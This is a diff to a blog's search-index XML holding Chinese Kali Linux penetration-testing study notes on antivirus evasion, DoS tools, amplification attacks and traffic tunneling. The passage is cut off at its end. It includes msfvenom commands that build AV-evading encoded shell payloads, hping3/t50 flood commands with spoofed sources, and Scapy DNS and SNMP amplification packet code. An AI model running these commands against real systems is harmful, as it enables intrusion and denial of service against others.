@@ -4,6 +4,384 @@
   
     
     <entry>
+      <title>免杀</title>
+      <link href="/2020/11/20/%E5%85%8D%E6%9D%80/"/>
+      <url>/2020/11/20/%E5%85%8D%E6%9D%80/</url>
+      
+        <content type="html"><![CDATA[<h4 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h4><ul><li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装</li><li>出于某种恶意目的：控制、窃取、勒索、偷窥、推送、攻击。</li></ul><h5 id="主要防护手段"><a href="#主要防护手段" class="headerlink" title="主要防护手段"></a>主要防护手段</h5><ul><li>杀毒软件/防病毒软件/</li><li>客户端/服务器/邮件防病毒</li></ul><h5 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h5><ul><li>基于二进制文件中特征签名的黑名单检测</li><li>基于行为的分析方法（启发式）</li></ul><h5 id="事后手段"><a href="#事后手段" class="headerlink" title="事后手段"></a>事后手段</h5><ul><li>永远落后于病毒发展</li></ul><a id="more"></a><hr><h4 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h4><ul><li>修改二进制文件中的特征字符<ul><li>替换、擦除、修改</li></ul></li><li>加密技术（crypter）<ul><li>通过加密使得特征字符不可读，从而逃避AV检测</li><li>运行时分片分段的解密执行，注入进程或AV不检查的无害文件中</li></ul></li><li>防病毒软件的检测<ul><li>恶意程序本身的特征字符</li><li>加密器crypter的特征字符</li></ul></li></ul><h5 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h5><ul><li><p>恶意软件制造者：</p><ul><li>编写私有RAT软件，避免普遍被AV所知的特征字符</li><li>使用独有crypter软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li><li>Fully UnDetectable是最高追求（FUD）</li></ul></li><li><p>AV厂商</p><ul><li>广泛采集样本，尽快发现新出现的程序，更新病毒库</li><li>一般新的恶意软件安全UD窗口期是一周左右</li><li>与恶意软件制造者永无休止的拉锯战</li><li>新的启发式检测技术尚有待完善（误杀、漏杀）</li></ul></li><li><p>单一AV厂商的病毒库很难达到100%覆盖</p><ul><li><a href="https://www.virustotal.com" target="_blank" rel="noopener">https://www.virustotal.com</a><ul><li>接口被某些国家的AV软件免费利用，没有自己的病毒库</li></ul></li><li><a href="https://www.virscan.org" target="_blank" rel="noopener">https://www.virscan.org</a></li><li>在线多引擎查杀网站与AV厂商共享信息</li></ul></li><li><p>其它多引擎查毒站</p><ul><li><a href="https://nodistribute.com" target="_blank" rel="noopener">https://nodistribute.com</a></li><li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li></ul></li><li><p>常用RAT软件</p><ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul></li></ul><hr><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><ul><li><p>msfvenom</p><ul><li>生成木马</li><li>对木马进行编码、混淆</li></ul></li><li><p>生成反弹shell</p><ul><li><code>-msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code> </li></ul></li><li><p>生成加密编码反弹shell</p><ul><li><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5|msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw|msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o a.exe</code></li></ul></li><li><p>利用模板隐藏shell</p><ul><li><code>msfvenom -p windows/shell_revirse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code></li></ul></li></ul><hr><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul><li>软件开发商为保护版权，采用的混淆和加密技术、避免盗版逆向</li><li>常被恶意软件用于免杀目的</li></ul><h5 id="Hyperion（32bit-PE程序加密器）"><a href="#Hyperion（32bit-PE程序加密器）" class="headerlink" title="Hyperion（32bit PE程序加密器）"></a>Hyperion（32bit PE程序加密器）</h5><ul><li>Cryter（加密）/Container（解密器+PE Loader）</li></ul><hr><h4 id="自己编写后门"><a href="#自己编写后门" class="headerlink" title="自己编写后门"></a>自己编写后门</h4><p>编译：</p><ul><li>Windows reverse shell<ul><li>wine gcc.exe windows.c -o windows.exe -lws2_32</li></ul></li><li>Linux shell<ul><li>gcc linux_revers_shell.c -o linux</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>拒绝服务攻击工具</title>
+      <link href="/2020/11/19/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7/"/>
+      <url>/2020/11/19/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7/</url>
+      
+        <content type="html"><![CDATA[<h4 id="RUDY（Are-You-Dead-Yet-）"><a href="#RUDY（Are-You-Dead-Yet-）" class="headerlink" title="RUDY（Are You Dead Yet?）"></a>RUDY（Are You Dead Yet?）</h4><ul><li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li><li>每次只传输一个字节的数据</li><li>攻击有表单WEB页面，攻击时需指定攻击的参数名称</li><li><a href="https://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">https://sourceforge.net/projects/r-u-dead-yet/</a></li><li>美剧“黑客军团”中提到此攻击手段</li><li>必须是POST请求，页面中必须要有表单</li></ul><a id="more"></a><hr><h4 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h4><ul><li><p>几乎可以定制发送任何TCP/IP数据包，用于测试FW、端口扫描、性能测试</p></li><li><p>Syn Flood攻击</p><ul><li><code>hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 1.1.1.1</code></li><li><code>hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1</code></li></ul></li><li><p>TCP Flood攻击</p><ul><li><code>hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1</code></li></ul></li><li><p>ICMP Flood攻击</p><ul><li><code>hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.2</code></li></ul></li><li><p>UDP Flood攻击</p><ul><li><code>hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2</code></li></ul></li><li><p>LAND攻击</p><ul><li>源地址和目的地址都是受害者，受害者与自己完成三次握手,或者不同端口相互循环应答。</li><li><code>hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></li></ul></li><li><p>参数：</p><ul><li>-a 伪造源地址</li><li>-s 源端口</li><li>-d 数据段字节</li><li>-p 目标端口</li></ul></li></ul><hr><h4 id="Nping"><a href="#Nping" class="headerlink" title="Nping"></a>Nping</h4><ul><li><p>nmap 的组件之一</p></li><li><p>TCP全连接DoS攻击</p><ul><li><code>nping --tcp-connect --rate=10000 -c 10000000000 -q 1.1.1.1</code></li></ul></li><li><p>查公网IP</p><ul><li><code>nping --echo-client &quot;public&quot; echo.nmap.org --udp</code><ul><li>传“public”字符到echo.nmap.org，会返回自己的公网IP</li></ul></li></ul></li></ul><hr><h4 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h4><ul><li><p>http/https 压力测试工具，模拟多个用户并发访问请求</p></li><li><p>siege -g <a href="http://1.1.1.1/a.php" target="_blank" rel="noopener">http://1.1.1.1/a.php</a> / 1.1.1.1</p></li><li><p>siege -i -c 1000 <a href="http://1.1.1.1/a.php" target="_blank" rel="noopener">http://1.1.1.1/a.php</a> -A siegehttp</p></li><li><p>同时攻击多个url，使用-f调用字典文件</p><ul><li>/etc/siege/urls.txt</li></ul></li><li><p>参数：</p><ul><li>-i：三种方式之一，internet</li><li>-A：UserAgent</li><li>-c：并发用户数</li></ul></li></ul><hr><h4 id="T50"><a href="#T50" class="headerlink" title="T50"></a>T50</h4><ul><li><p>网络压力测试</p></li><li><p><code>t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80</code></p></li><li><p><code>t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 80</code></p></li></ul><hr><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><ul><li><p><code>grep dos /usr/share/nmap/script/script.db|cut -d &quot;\&quot; -f 2</code></p></li><li><p><code>nmap -p445 --script=xxxx 1.1.1.1</code></p></li></ul><hr><h4 id="匿名者发布的DoS工具"><a href="#匿名者发布的DoS工具" class="headerlink" title="匿名者发布的DoS工具"></a>匿名者发布的DoS工具</h4><ul><li>LOIC</li><li>HOIC</li><li>DDoSer</li><li>招募志愿者，发放以上工具</li><li>以上DoS工具不隐藏真实IP地址</li></ul><hr><h4 id="XOIC"><a href="#XOIC" class="headerlink" title="XOIC"></a>XOIC</h4><ul><li>攻击任意IP地址的指定端口</li><li>github</li><li>三种模式：test、normal、DoS Attack</li><li>支持协议：TCP/HTTP/UDP/ICMP</li></ul><hr><h4 id="HULK（Http-Unbearable-Load-King）"><a href="#HULK（Http-Unbearable-Load-King）" class="headerlink" title="HULK（Http Unbearable Load King）"></a>HULK（Http Unbearable Load King）</h4><ul><li>Python脚本</li><li>随机产生大量唯一的地址请求，避免缓存命中</li><li>耗尽WEB服务器资源池</li></ul><hr><h4 id="DDOSIM"><a href="#DDOSIM" class="headerlink" title="DDOSIM"></a>DDOSIM</h4><ul><li>7层拒绝服务工具（模拟多个僵尸机）</li><li>随机IP地址</li><li>基于TCP连接的攻击</li><li>应用层DDoS攻击</li><li>正常的HTTP请求、非正常的HTTP请求式DDoS</li><li>SMTP DDoS</li><li>随机端口的TCP连接洪水</li></ul><hr><h4 id="GoldenEye"><a href="#GoldenEye" class="headerlink" title="GoldenEye"></a>GoldenEye</h4><ul><li>http/https拒绝服务攻击工具</li><li>安全研究为目的的Python脚本</li><li>随机攻击向量，keep-alive，避免缓存命中</li><li><code>./goldeneye.py http://1.1.1.1 -w 50</code></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>拒绝服务-应用层DoS</title>
+      <link href="/2020/11/18/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E5%BA%94%E7%94%A8%E5%B1%82DoS/"/>
+      <url>/2020/11/18/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E5%BA%94%E7%94%A8%E5%B1%82DoS/</url>
+      
+        <content type="html"><![CDATA[<h4 id="应用层DoS"><a href="#应用层DoS" class="headerlink" title="应用层DoS"></a>应用层DoS</h4><ul><li>应用服务漏洞<ul><li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li><li>应用处理大量并发请求能力有限，被拒绝的是应用或O</li></ul></li><li>缓冲区溢出漏洞<ul><li>向目标函数随即提交数据，特定情况下数据覆盖临近寄存器或内存</li><li>影响：远程代码执行、DoS</li><li>利用模糊测试方法发现缓冲区溢出漏洞</li></ul></li></ul><a id="more"></a><hr><ul><li>CesarFTP 0.99 服务漏洞<ul><li>MKD+n个<code>/n</code></li></ul></li><li>Ms12-020 远程桌面协议漏洞<ul><li><code>searchsploit ms12-020</code></li><li><code>cat /usr/share/exploitdb/exploits/windows/dos/18606.txt</code></li></ul></li></ul><hr><ul><li><p>Slowhttptest(源自google)</p><ul><li>低带宽应用层慢速DoS攻击（相对于CC等快速攻击而言的慢速）</li><li>最早由Python编写，跨平台支持（Linux、win、Cygwin、OSX）</li><li>尤其擅长攻击apache、tomcat（几乎百发百中）</li><li>支持代理，大量应用服务器和安全设备都无法防护慢速攻击</li><li><code>unlimit -a</code>其中的open files限制了并发数<ul><li><code>unlimit -n 70000</code></li></ul></li><li><code>man slowhttptest</code></li></ul></li><li><p>攻击方法</p><ul><li>Slowloris、Slow HTTP POST 攻击<ul><li>耗尽应用的并发连接池，类似于Http层的Syn flood</li><li>HTTP协议默认在服务器全部接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DoS</li><li>Slowloris:完整的http请求结尾是\r\n\r\n,攻击发\r\n……</li><li>Slow POST：HTTP头content-length声明长度，但body部分缓慢发送。</li><li>Slow Read attack 攻击<ul><li>与slowloris and slow POST目的相同，都是耗尽应用的并发连接池</li><li>不同之处在于请求正常发送，但慢速读取响应数据</li><li>攻击者调整TCP window 窗口大小，使服务器慢速返回数据</li></ul></li><li>Apache Range Header attack<ul><li>客户端传输大文件时，体积超过HTTP Body大小限制进行分段</li><li>耗尽服务器CPU、内存资源</li></ul></li></ul></li></ul></li></ul><hr>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>拒绝服务-放大攻击</title>
+      <link href="/2020/11/17/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB/"/>
+      <url>/2020/11/17/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<h4 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a>DNS放大攻击</h4><ul><li>产生大流量的方法<ul><li>单机的带宽优势</li><li>巨大单机数量形成的流量汇聚</li><li>利用协议特性实现放大效果的流量</li></ul></li></ul><a id="more"></a><ul><li><p>DNS协议放大</p><ul><li>查询请求流量小，但响应流量可能非常大</li><li><code>dig ANY qq.com @114.114.114.114</code></li></ul></li><li><p>Scapy 构造攻击数据包</p><ul><li>IP/UDP/DNS/DNS查询内容</li><li>结合IP地址欺骗，利用大量DNS服务器做傀儡攻击目标</li></ul></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">i&#x3D;IP()<br>i.dst&#x3D;&quot;114.114.114.114&quot;<br>u&#x3D;UDP()<br>d&#x3D;DNS()<br>d.rd&#x3D;1<br>d.qdcount&#x3D;1<br>q.qname&#x3D;&quot;qq.com&quot;<br>q.qtype&#x3D;255<br>d.qd&#x3D;q<br>r&#x3D;(i&#x2F;u&#x2F;d)<br>sr1(r)<br></code></pre></td></tr></table></figure><h4 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a>SNMP放大攻击</h4><ul><li><p>简单网络管理协议</p><ul><li>Simple Network Management Protocol</li><li>服务端口 UDP 161/162</li><li>管理站（manager/客户端）、被管理设备（agent、服务端）</li><li>管理信息数据库（MIB）是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象。</li><li>每一个节点都有一个对象标识符（OID）来唯一标识</li><li>IETF定义标准的MIB库/厂家自定义MIB库</li></ul></li><li><p>攻击原理</p><ul><li>请求流量小，查询结果返回流量大</li><li>结合伪造源地址实现攻击</li></ul></li><li><p>攻击</p><ul><li>windows安装SNMP服务器</li><li>Scapy:</li></ul></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">i&#x3D;IP()<br>i.dis&#x3D;&quot;1.1.1.23&quot;<br>u&#x3D;UDP()<br>u.dport&#x3D;161<br>u.sport&#x3D;161<br>s&#x3D;SNMP()<br>b&#x3D;SNMPbulk()<br>b.max_repetitions&#x3D;100<br>b.varbindlist[SNMPvarbind(oid&#x3D;ASN1_OID(&#39;1.3.6.1.2.1.1&#39;)),SNMPvarbind(oid&#x3D;ASN1_OID(&#39;1.3.6.1.2.1.1.19.1.3&#39;))]<br>s.PDU&#x3D;b<br>r&#x3D;(i&#x2F;u&#x2F;s)<br>sr1(r)<br></code></pre></td></tr></table></figure><ul><li>用nmap在互联网扫描一个网段，得到所有开放161端口的ip,然后测试<ul><li><code>nmap -sU -p161 202.206.0.0/16</code></li></ul></li></ul><h4 id="NTP放大攻击"><a href="#NTP放大攻击" class="headerlink" title="NTP放大攻击"></a>NTP放大攻击</h4><ul><li><p>网络时间协议</p><ul><li>Network Time Protocol</li><li>保证网络设备时间同步</li><li>电子设备相互干扰导致时钟差异越来越大</li><li>如果时间不正确，会影响应用正常运行、日志审计不可信</li><li>服务端口UDP 123</li></ul></li><li><p>攻击原理</p><blockquote><p>放大反射dos攻击由CVE-2013-5211所致。且这漏洞是与molist功能有关。Ntpd4.2.7p26之前的版本都会去响应NTP中的mode7“monlist”请求。ntpd-4.2.7p26版本后，“monlist”特性已经被禁止，取而代之的是“mrulist”特性，使用mode6控制报文，并且实现了握手过程来阻止对第三方主机的放大攻击。</p></blockquote><ul><li>NTP服务器monlist（MON_GETLIST）查询功能<ul><li>监控NTP服务器的状况</li></ul></li><li>客户端查询时，NTP服务器返回最后同步时间的600个客户端IP<ul><li>每6个IP一个数据包，最多100个数据包（）放大100倍</li></ul></li></ul></li><li><p>NTP服务安装</p><ul><li><code>apt-get install ntp</code></li></ul></li><li><p>扫描</p><ul><li><code>nmap -sU -p123 192.168.8.0/24 --open</code></li><li><code>nmap -sU -p123 -sV 192.168.8.170</code></li></ul></li><li><p>判断使否启用了monlist查询功能</p><ul><li><code>ntpc -n -c monlist 192.168.8.170</code><ul><li>timeout说明没有启用，默认是关闭状态</li><li>开启方法：<ul><li><code>vim /etc/ntp.conf</code>注释掉两行restrict开头的命令，然后重启服务</li></ul></li></ul></li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>请求流量小，查询结果返回流量大</li><li>结合源IP地址欺骗</li><li>利用大量服务器发起攻击</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>拒绝服务</title>
+      <link href="/2020/11/16/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/"/>
+      <url>/2020/11/16/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/</url>
+      
+        <content type="html"><![CDATA[<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><ul><li>DoS（Denial of Service）</li><li>DDoS（）<ul><li>一对一的攻击完全拼各自的资源，效果差</li><li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li></ul></li><li>最强大最危险的攻击，攻击方式众多</li><li>Bill gates 僵尸程序</li></ul><a id="more"></a><h5 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h5><ul><li>世界最著名的黑客组织</li><li>组织结构宽松，人员来自世界各地</li><li>以DDoS攻击著称的无政府主义者</li><li>攻击恐怖组织也攻击政府宗教机构</li><li>近些年来涉足政治斗争</li><li>成员露面时均带有Guy Fawkes面具</li><li>最早的核心成员来自4chan图片社区</li><li>惯常雇佣外围黑客成员发动DDoS攻击</li><li>口号：We are Anonymous, We are Legion, We do not forgive, We do not forget, Expect us</li></ul><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><ul><li>D网络<ul><li>基于巨量的Flood耗尽目标网络带宽资源</li><li>ICMP Flood、UDP Flood</li></ul></li><li>D协议<ul><li>攻击协议漏洞发起的拒绝服务攻击</li><li>如SynFlood、Ping of Death、ARP、DNS、802.11、SSL</li></ul></li><li>D应用<ul><li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li><li>大量频繁访问消耗系统资源严重的应用</li><li>通常表现为操作系统正常运行，网络流量不大，但服务停止响应</li><li>可以是一击毙命，也可以是耗尽目标资源</li></ul></li></ul><h4 id="SYN-Flood（半连接）"><a href="#SYN-Flood（半连接）" class="headerlink" title="SYN Flood（半连接）"></a>SYN Flood（半连接）</h4><ul><li><p>用scapy直接发SYN，本机操作系统会自动回复RST给被攻击方发来的SYN/ACK</p><ul><li>需要在本机操作系统防火墙进行设置，阻止发出RST</li><li>并不会占用太多CPU或内存资源，但是会耗尽TCP连接数。</li></ul></li><li><p>常常伴随IP欺骗</p><ul><li>伪造源IP地址<ul><li>大部分ISP会在路由限制出站ip地址</li><li>企业防火墙也会进行入站过滤</li></ul></li><li>受害者可能是源、目的地址</li><li>防火墙基于地址的验证可以通过伪造地址绕过</li><li>压力测试模拟多用户可能就使用了IP地址欺骗</li><li>通过上层协议（比如TCP序列号）防止IP欺骗</li></ul></li></ul><h4 id="Smurf攻击（广播ping）"><a href="#Smurf攻击（广播ping）" class="headerlink" title="Smurf攻击（广播ping）"></a>Smurf攻击（广播ping）</h4><ul><li>世界上最古老的DDoS攻击技术<ul><li>向广播地址发送伪造源地址的ICMP echo Request（Ping）包</li><li>LAN所有计算机向伪造的源地址返回响应包</li><li>对现代操作系统几乎无效（不响应目标为广播的ping）</li></ul></li></ul><h4 id="Sockstress（全连接）"><a href="#Sockstress（全连接）" class="headerlink" title="Sockstress（全连接）"></a>Sockstress（全连接）</h4><ul><li>2008年由Jack C.Louis 发现</li><li>针对TCP服务的拒绝服务攻击<ul><li>消耗被攻击目标系统资源（不消耗网络资源）</li><li>与攻击目标建立大量socket链接</li><li>完成三次握手，最后的ACK包window大小为0（客户端不接受数据）</li><li>攻击者资源消耗小（CPU、内存、带宽）</li><li>异步攻击，单机可拒绝服务高配资源服务器</li><li>Window窗口实现的TCP流控</li></ul></li><li>防御措施<ul><li>根本的防御方法是采用白名单（不实际）</li><li>折中对策：限制单位时间内每IP建立的TCP连接数<ul><li>封杀每30秒与80端口建立连接超过10个的IP地址<ul><li><code>iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</code></li><li><code>iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</code></li></ul></li></ul></li><li>对DDoS攻击无效</li></ul></li></ul><h4 id="TearDrop（IP分片重叠）"><a href="#TearDrop（IP分片重叠）" class="headerlink" title="TearDrop（IP分片重叠）"></a>TearDrop（IP分片重叠）</h4><ul><li>主要针对早期微软操作系统</li><li>使用IP分段偏移实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li><li>攻击效果：被攻击者蓝屏、重启、卡死</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>流量操控技术-sslh、stunnle4</title>
+      <link href="/2020/11/14/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-sslh%E3%80%81stunnle4/"/>
+      <url>/2020/11/14/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-sslh%E3%80%81stunnle4/</url>
+      
+        <content type="html"><![CDATA[<h4 id="SSLH"><a href="#SSLH" class="headerlink" title="SSLH"></a>SSLH</h4><ul><li>端口分配器<ul><li>根据客户第一个包检测协议类型</li><li>根据协议检测结果将流量转发给不同目标</li><li>支持HTTP，HTTPS，SSH，OpenVPN，tinc，XMPP和其它可基于正则表达式判断的任何协议类型</li><li>适用于防火墙允许443端口入站房屋内流量的环境</li></ul></li><li>kali中配置文件在 /etc/default/sslh</li><li>使用一个端口映射多个服务</li></ul><a id="more"></a><h4 id="stunnel4"><a href="#stunnel4" class="headerlink" title="stunnel4"></a>stunnel4</h4><ul><li><p>官网：stunnel.org</p></li><li><p>无需修改源代码的情况下将TCP流量封装于SSl通道内</p></li><li><p>适用于本身不支持加密传输的应用</p></li><li><p>支持openssl安全特性</p></li><li><p>跨平台</p></li><li><p>性能优</p></li></ul><h5 id="内网安装Stunnel4服务器"><a href="#内网安装Stunnel4服务器" class="headerlink" title="内网安装Stunnel4服务器"></a>内网安装Stunnel4服务器</h5><p>服务端配置</p><ul><li>生成证书：<code>openssl req -new -days 365 -nodes -x509 -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem</code></li><li>创建配置文件 <code>/etc/stunnel/stunnel.conf</code></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">cert &#x3D; &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem<br>setuid &#x3D; stunnel4<br>setgid &#x3D; stunnel4<br>pid &#x3D; &#x2F;var&#x2F;run&#x2F;stunnel4&#x2F;stunnel4.pid<br>[mysqls]<br>accept &#x3D; 0.0.0.0:443<br>connect &#x3D; 1.1.1.17:3306<br></code></pre></td></tr></table></figure><p>Stunnel4自动启动</p><ul><li>修改配置文件<code>/etc/default/stunnel4</code></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ENABLE&#x3D;1<br></code></pre></td></tr></table></figure><ul><li>启动stunnel4服务端<ul><li>stunnel4 /etc/stunnel/stunnel.conf</li></ul></li><li>防火墙规则<ul><li>端口映射TCP/443端口到stunnel4服务端</li><li>设置防火墙规则</li></ul></li></ul><p>客户端配置：</p><ul><li>kali自带stunnel4</li><li>客户端端配置<ul><li><code>/etc/stunnel/stunnel.conf</code></li></ul></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">client &#x3D; yes<br>[mysqls]<br>accept &#x3D; 3306<br>connect &#x3D; 192.168.43.3:443<br></code></pre></td></tr></table></figure><ul><li>启动<code>stunnel4 /etc/stunnel/stunnel.conf</code></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>流量操控技术-ptunnle、proxytunnle</title>
+      <link href="/2020/11/13/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-ptunnle%E3%80%81proxytunnle/"/>
+      <url>/2020/11/13/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-ptunnle%E3%80%81proxytunnle/</url>
+      
+        <content type="html"><![CDATA[<h4 id="ptunnle"><a href="#ptunnle" class="headerlink" title="ptunnle"></a>ptunnle</h4><ul><li>ping tunnel ICMP隧道工具，通过ICMP echo（ping requests）和reply（ping reply）实现隧道。</li><li>适用于防火墙只允许ping出站流量的环境</li><li>支持多并发连接、性能优</li><li>支持身份验证</li><li>需要root权限</li><li>支持抓包<ul><li>Win：winpcap</li><li>Linux：libpcap</li></ul></li><li>工作过程<ul><li>Proxy、Client、Destination</li></ul></li></ul><a id="more"></a><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><ul><li><p>服务端：</p><ul><li><code>ptunnel -x 1234</code><ul><li>-x 密码</li></ul></li></ul></li><li><p>客户端：</p><ul><li><code>ptunnel -p &lt;proxyIP&gt; -lp &lt;local listen port&gt; -da &lt;destinationIP&gt; -dp&lt;destination port&gt; -x &lt;passwd&gt;</code></li><li><code>ptunnel -p 192.168.43.72 -lp 2222 -da 192.168.43.72 -dp 22 -x 1234</code></li></ul></li><li><p>嵌套ssh隧道</p></li><li><p>0.72及以前存在DDos漏洞</p></li></ul><h4 id="proxytunnle"><a href="#proxytunnle" class="headerlink" title="proxytunnle"></a>proxytunnle</h4><ul><li>通过标准的HTTP/HTTPS代理创建隧道的工具</li><li>通过HTTP CONNECT方法封装信息</li><li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li><li>无法创建DNS隧道和ICMP隧道</li></ul><h5 id="实验环境1"><a href="#实验环境1" class="headerlink" title="实验环境1"></a>实验环境1</h5><ul><li><p>防火墙只开放了代理服务器访问外网的80端口</p></li><li><p>内网机器通过1.1.1.13上的squid3 http代理上网</p><ul><li>修改/etc/squid/squid.conf <ul><li>http_port 